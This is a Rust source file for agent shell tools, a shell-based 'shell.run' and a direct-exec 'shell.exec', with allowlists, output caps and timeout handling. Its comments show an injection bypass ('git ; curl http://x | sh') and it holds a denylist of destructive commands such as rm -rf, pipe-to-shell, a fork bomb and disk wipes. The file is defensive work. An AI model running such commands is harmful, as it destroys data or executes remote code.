//! [`ShellTool`] — run a shell command and capture its stdout, stderr, and exit
//! code.
//!
//! # ⚠️ Security warning
//!
//! This tool executes arbitrary commands through the system shell (`bash -c` on
//! Unix, `cmd /C` on Windows). It is the single most dangerous capability the
//! built-in toolset ships. **Treat every [`ShellTool`] as a remote-code-execution
//! primitive whose blast radius is whatever the host process can do.**
//!
//! - [`ShellTool::with_allowlist`] narrows the tool to commands whose leading
//!   prefix is in a caller-supplied set. This *raises the bar* over
//!   [`without_allowlist`](ShellTool::without_allowlist) but is **not** a
//!   confinement boundary and is **not** by itself sufficient for untrusted
//!   input — see the prefix-gate caveat below.
//! - [`ShellTool::without_allowlist`] runs **anything**. It exists for local
//!   development only. Do not register it on a server, behind a public channel
//!   adapter, or anywhere an untrusted prompt can reach it.
//!
//! **The allowlist is a prefix gate, not a sandbox — do not rely on it to
//! confine untrusted input.** It matches the *start* of the command line and
//! does not parse shell grammar, so an allowlisted prefix can chain straight to
//! arbitrary execution: with `["git"]`, `git ; curl http://x | sh` and
//! `git$(reboot)` both begin with `git` and are admitted, and an allowed prefix
//! that invokes a shell built-in (`bash -c`, `env`, `sh`, `xargs`, …) pivots the
//! same way. The `DESTRUCTIVE_PATTERNS` denylist catches a few notorious shapes
//! but is explicitly not complete.
//!
//! Because `shell.run` deliberately runs the line through the system shell
//! (composition — pipes, redirects, substitutions — is its purpose), the
//! allowlist cannot be made a safe boundary without becoming a different tool.
//! That different tool is [`ShellExecTool`] (`shell.exec`), defined below: it
//! execs argv directly with no shell, matches `argv[0]` exactly rather than by
//! prefix, and is the right choice wherever shell composition is not actually
//! required. For an untrusted prompt, **do not** treat any `shell.run`
//! configuration as a sandbox: gate it with the §11 cap-token + Cedar layers
//! (which decide whether the capability may run at all), prefer `shell.exec`,
//! or use the sibling `terminal.exec` tool.

use std::process::Stdio;
use std::time::Duration;

use async_trait::async_trait;
use regex::Regex;
use serde::Deserialize;
use serde_json::json;
use tokio::io::AsyncReadExt;
use tokio::process::Command;

use ardur_runtime::CostTuple;

use crate::capability::Capability;
use crate::error::ToolError;
use crate::tool::{Tool, ToolContext, ToolId, ToolOutput, ToolSchema};

/// Default wall-clock ceiling for a command, in seconds, when the caller does
/// not supply `timeout_secs`.
///
/// Deliberately below the fused runtime's own default per-tool deadline (30s):
/// the outer deadline starts before argument parsing and process spawn, so an
/// equal inner default would normally lose the race and the caller would see a
/// `ToolTimeout` error instead of the advertised `{ timed_out: true }` result.
/// The margin lets this tool report its own timeout first.
const DEFAULT_TIMEOUT_SECS: u64 = 25;

/// Ceiling on captured stdout+stderr, in bytes, for a single invocation.
///
/// An allowlisted binary can still emit unbounded output (`yes`, a verbose
/// build, `cat` on a huge file). Reading with `wait_with_output()` buffers the
/// whole stream in memory, so a command can exhaust the host well before any
/// wall-clock timeout fires. Output is drained through bounded sinks instead
/// and flagged as truncated at this limit.
const MAX_OUTPUT_BYTES: usize = 1024 * 1024;

/// Accumulates at most `cap` bytes, latching `truncated` once more arrives.
struct BoundedSink {
    buf: Vec<u8>,
    cap: usize,
    truncated: bool,
}

impl BoundedSink {
    fn new(cap: usize) -> Self {
        Self {
            buf: Vec::new(),
            cap,
            truncated: false,
        }
    }

    /// Append as much of `chunk` as still fits under `cap`; the remainder is
    /// discarded and [`Self::truncated`] is latched.
    fn push(&mut self, chunk: &[u8]) {
        if self.buf.len() >= self.cap {
            self.truncated = true;
            return;
        }
        let remaining = self.cap - self.buf.len();
        if chunk.len() <= remaining {
            self.buf.extend_from_slice(chunk);
        } else {
            self.buf.extend_from_slice(&chunk[..remaining]);
            self.truncated = true;
        }
    }

    fn into_string_lossy(self) -> String {
        String::from_utf8_lossy(&self.buf).into_owned()
    }
}

/// A `PATH` for the child containing only absolute components.
///
/// An inherited `PATH` may carry an empty entry (`"a::b"`, or a leading/
/// trailing `:`) or a relative one, both of which resolve against the child's
/// working directory. Because `cwd` is caller-controlled, that would let a file
/// in the working directory named exactly like an allowlisted token be selected
/// by `Command::new("git")` — the textual allowlist would no longer decide which
/// executable runs. Filtering to absolute entries closes that; a caller that
/// needs a specific binary can pass an absolute path as `argv[0]`.
fn sanitized_path() -> std::ffi::OsString {
    let inherited = std::env::var_os("PATH").unwrap_or_default();
    let absolute: Vec<_> = std::env::split_paths(&inherited)
        .filter(|p| p.is_absolute())
        .collect();
    std::env::join_paths(absolute).unwrap_or_default()
}

/// Spawn `cmd` and drain both pipes through bounded sinks, capping memory as
/// bytes arrive rather than after the process exits.
///
/// Returns `(stdout, stderr, exit_code, truncated)`.
async fn run_capped(
    mut cmd: Command,
    max_output_bytes: usize,
) -> std::io::Result<(String, String, i32, bool)> {
    let mut child = cmd.spawn()?;
    #[cfg(unix)]
    let child_pid = child.id();
    let mut stdout_pipe = child.stdout.take().expect("stdout is piped by the caller");
    let mut stderr_pipe = child.stderr.take().expect("stderr is piped by the caller");

    // On Unix the child leads its own process group (set by the caller), so a
    // dropped future — the timeout path — signals the whole tree rather than
    // just the immediate child, which `kill_on_drop` alone would leave behind.
    #[cfg(unix)]
    let _group_guard = ProcessGroupGuard(child_pid);

    async fn drain<R: tokio::io::AsyncRead + Unpin>(
        pipe: &mut R,
        cap: usize,
    ) -> std::io::Result<BoundedSink> {
        let mut sink = BoundedSink::new(cap);
        let mut chunk = [0u8; 8192];
        loop {
            let n = pipe.read(&mut chunk).await?;
            if n == 0 {
                break;
            }
            sink.push(&chunk[..n]);
        }
        Ok(sink)
    }

    // Drain concurrently: a child that fills one pipe while we block on the
    // other would deadlock.
    let (out, err) = tokio::try_join!(
        drain(&mut stdout_pipe, max_output_bytes),
        drain(&mut stderr_pipe, max_output_bytes),
    )?;
    let status = child.wait().await?;
    let truncated = out.truncated || err.truncated;
    Ok((
        out.into_string_lossy(),
        err.into_string_lossy(),
        status.code().unwrap_or(-1),
        truncated,
    ))
}

/// Signals the child's whole process group with SIGKILL when dropped.
///
/// The timeout path drops the in-flight future, which drops this guard. The
/// child leads its own group, so signalling `-pid` reaches descendants an
/// allowlisted binary forked — `kill_on_drop` reaps only the direct child, and
/// a forked background process would otherwise outlive the invocation that
/// already reported `{ timed_out: true }`.
#[cfg(unix)]
struct ProcessGroupGuard(Option<u32>);

#[cfg(unix)]
impl Drop for ProcessGroupGuard {
    fn drop(&mut self) {
        if let Some(pid) = self.0 {
            // Signalling the negated pid targets the process group led by
            // `pid`. Errors are ignored: on the success path the group has
            // normally already exited. rustix keeps this `unsafe`-free.
            if let Ok(raw) = i32::try_from(pid) {
                if let Some(p) = rustix::process::Pid::from_raw(raw) {
                    let _ = rustix::process::kill_process_group(p, rustix::process::Signal::KILL);
                }
            }
        }
    }
}

/// Best-effort patterns for known destructive shell commands. These are blocked
/// even in `Allowlist::Any` mode as a defence-in-depth measure, but they are
/// deliberately not described as a sandbox: shell syntax is too broad for a
/// regex denylist to parse completely, and callers still need a narrow
/// allowlist plus capability/Cedar enforcement for untrusted prompts.
static DESTRUCTIVE_PATTERNS: once_cell::sync::Lazy<Vec<Regex>> = once_cell::sync::Lazy::new(|| {
    vec![
        // Recursive force-remove, including `-rf`, `-fr`, `-r -f`, and `-f -r`.
        Regex::new(r"(?i)\brm\b[^;&|\n]*\s-[[:alpha:]]*r[[:alpha:]]*f[[:alpha:]]*\b")
            .expect("valid destructive pattern regex"),
        Regex::new(r"(?i)\brm\b[^;&|\n]*\s-[[:alpha:]]*f[[:alpha:]]*r[[:alpha:]]*\b")
            .expect("valid destructive pattern regex"),
        Regex::new(r"(?i)\brm\b[^;&|\n]*\s-[[:alpha:]]*r[[:alpha:]]*\b[^;&|\n]*\s-[[:alpha:]]*f[[:alpha:]]*\b")
            .expect("valid destructive pattern regex"),
        Regex::new(r"(?i)\brm\b[^;&|\n]*\s-[[:alpha:]]*f[[:alpha:]]*\b[^;&|\n]*\s-[[:alpha:]]*r[[:alpha:]]*\b")
            .expect("valid destructive pattern regex"),
        // Pipe any producer into a shell. This catches both curl/wget pipe-to-sh
        // and less obvious producers such as `base64 -d | sh`.
        Regex::new(r"(?i)\|\s*(?:ba)?sh\b").expect("valid destructive pattern regex"),
        // Fork bomb
        Regex::new(r"(?i):\(\)\s*\{\s*:\|:&\s*\};:").expect("valid destructive pattern regex"),
        // Recursive chmod/chown on root
        Regex::new(r"(?i)\bchmod\s+.*-R\s+.*/\b").expect("valid destructive pattern regex"),
        Regex::new(r"(?i)\bchown\s+.*-R\s+.*/\b").expect("valid destructive pattern regex"),
        // Disk wipe / filesystem creation. Permit whitespace around `=` because
        // shell users often add it while experimenting, even though some forms
        // are not accepted by `dd` itself.
        Regex::new(r"(?i)\bdd\b[^;&|\n]*\bif\s*=\s*/dev/(?:zero|random|urandom)\b")
            .expect("valid destructive pattern regex"),
        Regex::new(r"(?i)\bdd\b[^;&|\n]*\bof\s*=\s*/dev/")
            .expect("valid destructive pattern regex"),
        Regex::new(r"(?i)\bmkfs\b").expect("valid destructive pattern regex"),
        // Shutdown/reboot
        Regex::new(r"(?i)\b(shutdown|reboot|halt|poweroff)\b")
            .expect("valid destructive pattern regex"),
    ]
});

/// The policy [`ShellTool`] gates each command against.
enum Allowlist {
    /// Permit any command. Dev-only; see the module security warning.
    Any,
    /// Permit only commands matching one of these patterns. Each pattern is one
    /// or more `|`-separated prefixes.
    Patterns(Vec<String>),
}

impl Allowlist {
    /// Whether `command` is permitted under this policy.
    ///
    /// A pattern matches when the (leading-whitespace-trimmed) command equals
    /// one of its `|`-separated alternatives, or begins with one followed by
    /// whitespace — so `git` permits `git status` but not `gitfoo`.
    fn permits(&self, command: &str) -> bool {
        match self {
            Allowlist::Any => true,
            Allowlist::Patterns(patterns) => {
                let cmd = command.trim_start();
                patterns
                    .iter()
                    .flat_map(|p| p.split('|'))
                    .map(str::trim)
                    .filter(|alt| !alt.is_empty())
                    .any(|alt| {
                        cmd == alt
                            || cmd
                                .strip_prefix(alt)
                                .is_some_and(|rest| rest.starts_with(char::is_whitespace))
                    })
            }
        }
    }
}

/// Arguments to a `shell.run` invocation.
#[derive(Deserialize)]
struct ShellArgs {
    /// The command line, run through the system shell.
    command: String,
    /// Wall-clock ceiling in seconds; the command is killed past it.
    #[serde(default = "default_timeout_secs")]
    timeout_secs: u64,
    /// Working directory; falls back to the context's `cwd` when absent.
    #[serde(default)]
    cwd: Option<String>,
}

fn default_timeout_secs() -> u64 {
    DEFAULT_TIMEOUT_SECS
}

/// A tool that runs a shell command and returns `{ stdout, stderr, exit_code,
/// timed_out }`.
///
/// See the [module security warning](self) before registering one. Construct
/// with [`ShellTool::with_allowlist`] for any non-dev context, or
/// [`ShellTool::without_allowlist`] for local development only.
pub struct ShellTool {
    schema: ToolSchema,
    allowlist: Allowlist,
    caps: Vec<Capability>,
}

impl ShellTool {
    /// The id [`ShellTool`] registers under.
    pub const ID: &'static str = "shell.run";

    /// A [`ShellTool`] confined to commands matching `commands`.
    ///
    /// Each entry is one or more `|`-separated command prefixes (e.g.
    /// `"git|cargo"` or `"ls"`). A command is permitted when it equals a prefix
    /// or begins with one followed by whitespace. A command matching nothing is
    /// refused with [`ToolError::Denied`].
    ///
    /// This is a **prefix gate, not a sandbox**: because the command still runs
    /// through the system shell, an allowlisted prefix can chain to arbitrary
    /// execution (`with_allowlist(["git"])` admits `git ; <anything>`). It is
    /// strictly better than [`without_allowlist`](Self::without_allowlist), but
    /// do not rely on it alone to confine an untrusted prompt — gate the
    /// capability with cap-token + Cedar, or prefer `terminal.exec`. See the
    /// module-level security warning.
    #[must_use]
    pub fn with_allowlist(commands: Vec<String>) -> Self {
        Self::build(Allowlist::Patterns(commands))
    }

    /// A [`ShellTool`] that permits **any** command.
    ///
    /// # ⚠️ Dev use only
    ///
    /// This is unrestricted remote code execution: it runs whatever the model
    /// asks. Never register it on a server or any surface an untrusted prompt
    /// can reach. Use [`ShellTool::with_allowlist`] in production.
    #[must_use]
    pub fn without_allowlist() -> Self {
        Self::build(Allowlist::Any)
    }

    fn build(allowlist: Allowlist) -> Self {
        let schema = ToolSchema {
            description: "Run a shell command. Returns stdout, stderr, exit code.".to_string(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "command": { "type": "string", "description": "The command line to run." },
                    "timeout_secs": {
                        "type": "integer",
                        "description": "Wall-clock ceiling in seconds (default 30).",
                        "minimum": 1
                    },
                    "cwd": {
                        "type": "string",
                        "description": "Working directory; defaults to the session cwd."
                    }
                },
                "required": ["command"]
            }),
            output_schema: json!({
                "type": "object",
                "properties": {
                    "stdout": { "type": "string" },
                    "stderr": { "type": "string" },
                    "exit_code": { "type": "integer" },
                    "timed_out": { "type": "boolean" }
                },
                "required": ["stdout", "stderr", "exit_code", "timed_out"]
            }),
            examples: vec![],
        };
        Self {
            schema,
            allowlist,
            // ShellExec is the headline grant; ProcessSpawn names the fork/exec
            // the shell performs, so both authorization layers see the full
            // surface this tool touches.
            caps: vec![Capability::ShellExec, Capability::ProcessSpawn],
        }
    }
}

/// Whether `c` is permitted inside a `shell.exec` command **string**.
///
/// An allowlist — alphanumerics, space/tab, and the punctuation that appears in
/// flags, paths, and `key=value` pairs — rather than an operator denylist, so it
/// fails closed against anything novel. Mirrors the `terminal.exec` charset
/// (ARD-476): every shell operator, metacharacter, expansion, and quote is
/// rejected, and newline/carriage-return are excluded because they are command
/// separators.
///
/// This gate applies only to the `command` string form, whose split is naive
/// whitespace tokenization and therefore cannot honour quoting. The explicit
/// `argv` form does not need it: array elements are passed to `execvp` as
/// literal arguments and are never parsed by a shell.
fn is_safe_exec_char(c: char) -> bool {
    c.is_ascii_alphanumeric()
        || c == ' '
        || c == '\t'
        || matches!(c, '-' | '_' | '.' | '/' | ':' | ',' | '=' | '+' | '@' | '%')
}

/// The binary policy [`ShellExecTool`] gates `argv[0]` against.
enum BinaryAllowlist {
    /// Permit any binary. Dev-only.
    Any,
    /// Permit only these exact binary names.
    Exact(Vec<String>),
}

impl BinaryAllowlist {
    /// Whether `binary` is permitted.
    ///
    /// Unlike [`Allowlist::permits`], this is an **exact** match on the whole
    /// argv[0], never a prefix: `git` permits `git` and nothing else, so no
    /// `gitfoo` and no `git; …` (which cannot arise here anyway, since the
    /// string is never handed to a shell).
    fn permits(&self, binary: &str) -> bool {
        match self {
            BinaryAllowlist::Any => true,
            BinaryAllowlist::Exact(allowed) => allowed
                .iter()
                .flat_map(|p| p.split('|'))
                .map(str::trim)
                .filter(|alt| !alt.is_empty())
                .any(|alt| alt == binary),
        }
    }
}

/// Arguments to a `shell.exec` invocation.
///
/// Exactly one of `argv` or `command` must be supplied.
#[derive(Deserialize)]
struct ShellExecArgs {
    /// Explicit argv. `argv[0]` is the binary; the rest are passed verbatim.
    #[serde(default)]
    argv: Option<Vec<String>>,
    /// A safe-charset command string, split on whitespace into argv.
    #[serde(default)]
    command: Option<String>,
    /// Wall-clock ceiling in seconds; the command is killed past it.
    #[serde(default = "default_timeout_secs")]
    timeout_secs: u64,
    /// Working directory; falls back to the context's `cwd` when absent.
    #[serde(default)]
    cwd: Option<String>,
}

/// A tool that execs a command **directly** — no `bash -c`, no `cmd /C` — and
/// returns `{ stdout, stderr, exit_code, timed_out }`.
///
/// # What this confines, and what it does not
///
/// `shell.exec` is the hardened sibling of [`ShellTool`]. It removes the shell
/// interpretation layer entirely:
///
/// - The process is spawned with `Command::new(argv[0]).args(&argv[1..])`, so
///   no metacharacter in any argument is ever interpreted. `;`, `|`, `` ` ``,
///   `$(…)`, `&&`, redirects and globs arrive at the target binary as literal
///   bytes.
/// - `argv[0]` is matched **exactly** against the allowlist, not by prefix, so
///   an allowlisted name cannot be extended (`gitfoo`) or chained (`git; id`).
/// - The `command` string form is additionally restricted to a safe charset,
///   because splitting a string on whitespace cannot honour quoting.
/// - Captured output is bounded as it arrives ([`MAX_OUTPUT_BYTES`]) and
///   flagged with `truncated`, so an allowlisted binary that emits endlessly
///   cannot exhaust memory before the deadline fires.
/// - The destructive-pattern denylist is matched against the binary and its
///   option flags, never a flattened argument string: direct exec cannot turn
///   an operand into a command, so `echo "rm -rf /x"` is a print, not a
///   deletion.
///
/// **It does not sandbox the allowlisted binary itself.** A binary that spawns
/// a shell on your behalf remains a pivot regardless of how it is invoked:
/// `sh`, `bash`, `env`, `xargs`, `find … -exec`, `git -c core.pager=…`,
/// `ssh host …`, and any interpreter (`python -c`, `perl -e`) all execute
/// caller-supplied code through their own argument handling. Allowlisting such
/// a binary grants what that binary can do.
///
/// Nothing in this crate can narrow that. The cap-token and Cedar layers
/// authorize *whether the tool may be invoked* — `authorize_tool_invocation`
/// sees the tool name and claim-derived attributes, not argv and not the
/// operations the spawned process goes on to perform — so they cannot confine
/// a process once it is running. Confining **what a permitted binary does**
/// requires an OS-level sandbox (container, seccomp, jail) or choosing a
/// genuinely leaf binary that cannot execute anything else.
///
/// Prefer this tool over [`ShellTool`] wherever shell composition (pipes,
/// redirects, substitutions) is not actually required.
pub struct ShellExecTool {
    schema: ToolSchema,
    allowlist: BinaryAllowlist,
    caps: Vec<Capability>,
}

impl ShellExecTool {
    /// The id [`ShellExecTool`] registers under.
    pub const ID: &'static str = "shell.exec";

    /// A [`ShellExecTool`] confined to the exact binaries in `binaries`.
    ///
    /// Each entry is one or more `|`-separated binary names (e.g. `"git|cargo"`
    /// or `"ls"`). `argv[0]` must equal one of them exactly. A command whose
    /// binary matches nothing is refused with [`ToolError::Denied`].
    #[must_use]
    pub fn with_allowlist(binaries: Vec<String>) -> Self {
        Self::build(BinaryAllowlist::Exact(binaries))
    }

    /// A [`ShellExecTool`] that permits **any** binary.
    ///
    /// # ⚠️ Dev use only
    ///
    /// Direct exec still means arbitrary code execution — it only removes shell
    /// *interpretation*. Never register this on a server or any surface an
    /// untrusted prompt can reach.
    #[must_use]
    pub fn without_allowlist() -> Self {
        Self::build(BinaryAllowlist::Any)
    }

    fn build(allowlist: BinaryAllowlist) -> Self {
        let schema = ToolSchema {
            description: "Execute a command directly (no shell). Supply argv as an array, or a \
                          simple command string without shell operators. Returns stdout, stderr, \
                          exit code."
                .to_string(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "argv": {
                        "type": "array",
                        "items": { "type": "string" },
                        "minItems": 1,
                        "description": "Explicit argv: argv[0] is the binary, the rest are passed \
                                        verbatim. Preferred — arguments may contain any bytes, as \
                                        they are never parsed by a shell."
                    },
                    "command": {
                        "type": "string",
                        "description": "Alternative to argv: a command string split on whitespace. \
                                        Restricted to a safe charset (no shell operators, quotes, \
                                        or expansions) because the split cannot honour quoting."
                    },
                    "timeout_secs": {
                        "type": "integer",
                        "description": "Wall-clock ceiling in seconds (default 25).",
                        "minimum": 1
                    },
                    "cwd": {
                        "type": "string",
                        "description": "Working directory; defaults to the session cwd."
                    }
                },
                // Exactly one input form. Encoded in the published contract so a
                // schema-constrained client cannot emit a request that always
                // fails at invocation.
                "oneOf": [
                    { "required": ["argv"], "not": { "required": ["command"] } },
                    { "required": ["command"], "not": { "required": ["argv"] } }
                ]
            }),
            output_schema: json!({
                "type": "object",
                "properties": {
                    "stdout": { "type": "string" },
                    "stderr": { "type": "string" },
                    "exit_code": { "type": "integer" },
                    "timed_out": { "type": "boolean" },
                    "truncated": {
                        "type": "boolean",
                        "description": "Output exceeded the capture ceiling and was cut short."
                    }
                },
                "required": ["stdout", "stderr", "exit_code", "timed_out", "truncated"]
            }),
            examples: vec![],
        };
        Self {
            schema,
            allowlist,
            // Same capability pair as `shell.run`: the cap-token and Cedar
            // layers see an identical surface, so hardening the exec path does
            // not quietly widen what an existing grant authorizes.
            caps: vec![Capability::ShellExec, Capability::ProcessSpawn],
        }
    }

    /// Resolve the request into an argv vector, enforcing the input gates.
    fn resolve_argv(args: &ShellExecArgs) -> Result<Vec<String>, ToolError> {
        let argv = match (&args.argv, &args.command) {
            (Some(_), Some(_)) => {
                return Err(ToolError::InvalidArgs(
                    "supply exactly one of `argv` or `command`, not both".to_string(),
                ));
            }
            (None, None) => {
                return Err(ToolError::InvalidArgs(
                    "one of `argv` or `command` is required".to_string(),
                ));
            }
            (Some(argv), None) => argv.clone(),
            (None, Some(command)) => {
                // The string form is split naively on whitespace, which cannot
                // honour quoting — so anything a shell would treat as syntax is
                // rejected outright rather than silently mis-split.
                if let Some(bad) = command.chars().find(|c| !is_safe_exec_char(*c)) {
                    return Err(ToolError::Denied {
                        reason: format!(
                            "command contains a disallowed character {bad:?}; `command` accepts \
                             only simple commands without shell operators, quotes, or expansions \
                             — pass `argv` to supply arguments containing these characters"
                        ),
                    });
                }
                command.split_whitespace().map(String::from).collect()
            }
        };

        if argv.is_empty() {
            return Err(ToolError::InvalidArgs(
                "`argv` must not be empty".to_string(),
            ));
        }

        let binary = &argv[0];
        if binary.trim().is_empty() {
            return Err(ToolError::InvalidArgs(
                "`argv[0]` (the binary) must not be empty".to_string(),
            ));
        }
        // argv[0] is the one element whose content selects what executes, so it
        // is held to the safe charset even in the explicit-argv form.
        if let Some(bad) = binary.chars().find(|c| !is_safe_exec_char(*c)) {
            return Err(ToolError::Denied {
                reason: format!(
                    "binary `{binary}` contains a disallowed character {bad:?}; argv[0] must be a \
                     plain binary name or path"
                ),
            });
        }
        if binary.chars().any(char::is_whitespace) {
            return Err(ToolError::Denied {
                reason: format!("binary `{binary}` must not contain whitespace"),
            });
        }

        Ok(argv)
    }
}

#[async_trait]
impl Tool for ShellExecTool {
    fn id(&self) -> ToolId {
        ToolId::new(Self::ID)
    }

    fn schema(&self) -> &ToolSchema {
        &self.schema
    }

    async fn invoke(
        &self,
        ctx: &ToolContext,
        args: serde_json::Value,
    ) -> Result<ToolOutput, ToolError> {
        let args: ShellExecArgs =
            serde_json::from_value(args).map_err(|e| ToolError::InvalidArgs(e.to_string()))?;

        let argv = Self::resolve_argv(&args)?;
        let binary = argv[0].clone();

        if !self.allowlist.permits(&binary) {
            return Err(ToolError::Denied {
                reason: format!("binary is not on the shell.exec allowlist: `{binary}`"),
            });
        }

        // Defence-in-depth, mirroring `shell.run` — but matched against the
        // BINARY plus its option flags, never the flattened argument string.
        // Direct exec already prevents a metacharacter from chaining a second
        // command, so the only thing left to catch is a destructive invocation
        // of the permitted binary itself. Flattening argv and re-parsing it
        // would misread literal operands as commands: an allowlisted `echo`
        // asked to print the text "rm -rf /tmp/x" can only print it, yet a
        // flattened match would deny it.
        //
        // Operands (non-flag arguments after argv[0]) are therefore excluded
        // from the matched string. Flags are kept because they carry the
        // destructive intent the patterns look for (`-rf`, `if=/dev/zero`).
        let inspected = std::iter::once(argv[0].as_str())
            .chain(
                argv[1..]
                    .iter()
                    .map(String::as_str)
                    .filter(|a| a.starts_with('-') || a.contains('=')),
            )
            .collect::<Vec<_>>()
            .join(" ");
        if DESTRUCTIVE_PATTERNS
            .iter()
            .any(|re| re.is_match(&inspected))
        {
            return Err(ToolError::Denied {
                reason: format!(
                    "command matches a destructive pattern and is blocked: `{inspected}`"
                ),
            });
        }

        let cwd = args.cwd.map_or_else(|| ctx.cwd.clone(), Into::into);

        // No `bash -c` / `cmd /C`: argv is handed to the OS verbatim, so no
        // metacharacter in any argument is ever interpreted.
        let mut cmd = Command::new(&binary);
        cmd.args(&argv[1..])
            .current_dir(&cwd)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .kill_on_drop(true);

        // An inherited PATH containing an empty or relative component would let
        // a caller-chosen `cwd` supply an executable named exactly like an
        // allowlisted token, so the textual allowlist would not decide which
        // binary actually runs. Override PATH with absolute entries only for
        // the child; a caller wanting a specific binary can pass an absolute
        // path as argv[0] instead.
        cmd.env("PATH", sanitized_path());

        // Put the child in its own process group so a timeout can signal the
        // whole tree. `kill_on_drop` reaps only the immediate child, so an
        // allowlisted process that forks could otherwise outlive the
        // invocation that reported `{ timed_out: true }`.
        #[cfg(unix)]
        cmd.process_group(0);

        let timeout = Duration::from_secs(args.timeout_secs);
        // Bounded drain, not `wait_with_output()`: an allowlisted binary can
        // emit unbounded output and exhaust memory long before the deadline.
        let content = match tokio::time::timeout(timeout, run_capped(cmd, MAX_OUTPUT_BYTES)).await {
            Ok(Ok((stdout, stderr, exit_code, truncated))) => json!({
                "stdout": stdout,
                "stderr": stderr,
                "exit_code": exit_code,
                "timed_out": false,
                "truncated": truncated,
            }),
            Ok(Err(e)) => {
                return Err(ToolError::ExecutionFailed(format!(
                    "failed to run `{binary}`: {e}"
                )));
            }
            Err(_elapsed) => json!({
                "stdout": "",
                "stderr": "",
                "exit_code": -1,
                "timed_out": true,
                "truncated": false,
            }),
        };

        Ok(ToolOutput {
            content: content.clone(),
            cost: CostTuple::default(),
            receipt_data: content,
        })
    }

    fn required_capabilities(&self) -> &[Capability] {
        &self.caps
    }
}

#[async_trait]
impl Tool for ShellTool {
    fn id(&self) -> ToolId {
        ToolId::new(Self::ID)
    }

    fn schema(&self) -> &ToolSchema {
        &self.schema
    }

    async fn invoke(
        &self,
        ctx: &ToolContext,
        args: serde_json::Value,
    ) -> Result<ToolOutput, ToolError> {
        let args: ShellArgs =
            serde_json::from_value(args).map_err(|e| ToolError::InvalidArgs(e.to_string()))?;

        if args.command.trim().is_empty() {
            return Err(ToolError::InvalidArgs(
                "`command` must not be empty".to_string(),
            ));
        }
        if !self.allowlist.permits(&args.command) {
            return Err(ToolError::Denied {
                reason: format!("command is not on the shell allowlist: `{}`", args.command),
            });
        }

        // Defence-in-depth: block known destructive patterns even when the
        // allowlist would otherwise permit the command. This catches footguns
        // like `rm -rf /` and `curl | sh` that an allowlist prefix alone
        // cannot prevent.
        if DESTRUCTIVE_PATTERNS
            .iter()
            .any(|re| re.is_match(&args.command))
        {
            return Err(ToolError::Denied {
                reason: format!(
                    "command matches a destructive pattern and is blocked: `{}`",
                    args.command
                ),
            });
        }

        let cwd = args.cwd.map_or_else(|| ctx.cwd.clone(), Into::into);

        // `bash -c`/`cmd /C` so the command line is interpreted as a shell would.
        #[cfg(windows)]
        let (program, flag) = ("cmd", "/C");
        #[cfg(not(windows))]
        let (program, flag) = ("bash", "-c");

        let mut cmd = Command::new(program);
        cmd.arg(flag)
            .arg(&args.command)
            .current_dir(&cwd)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            // On timeout the `wait_with_output` future (which owns the child) is
            // dropped; `kill_on_drop` ensures the child is reaped rather than
            // left running.
            .kill_on_drop(true);

        let child = cmd
            .spawn()
            .map_err(|e| ToolError::ExecutionFailed(format!("failed to spawn `{program}`: {e}")))?;

        let timeout = Duration::from_secs(args.timeout_secs);
        let content = match tokio::time::timeout(timeout, child.wait_with_output()).await {
            Ok(Ok(output)) => json!({
                "stdout": String::from_utf8_lossy(&output.stdout),
                "stderr": String::from_utf8_lossy(&output.stderr),
                // A signal-terminated process has no code; report -1.
                "exit_code": output.status.code().unwrap_or(-1),
                "timed_out": false,
            }),
            Ok(Err(e)) => {
                return Err(ToolError::ExecutionFailed(format!(
                    "command i/o failed: {e}"
                )));
            }
            Err(_elapsed) => json!({
                "stdout": "",
                "stderr": "",
                "exit_code": -1,
                "timed_out": true,
            }),
        };

        Ok(ToolOutput {
            content: content.clone(),
            cost: CostTuple::default(),
            receipt_data: content,
        })
    }

    fn required_capabilities(&self) -> &[Capability] {
        &self.caps
    }
}
